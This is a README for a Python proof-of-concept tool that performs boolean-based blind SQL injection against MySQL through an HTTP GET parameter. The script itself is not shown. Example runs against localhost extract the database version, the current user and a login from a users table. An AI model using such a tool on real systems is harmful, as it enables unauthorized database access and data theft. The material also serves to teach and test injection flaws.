# mysql_bb
Boolean-based blind SQL injection Proof of Concept for MySQL.

This script attempts to retrieve result of given SQL query by making boolean-based blind injection into supplied HTTP GET URI.
## Usage example
```bash
python3 mysql_bb_poc.py "http://localhost?param=" "select version()"
5.5.47-0+deb8u1
(+) done!
python3 mysql_bb_poc.py "http://localhost?param=" "select user()"
root@localhost
(+) done!
python3 mysql_bb_poc.py "http://localhost?param=" "select login from users"
admin
(+) done!
```
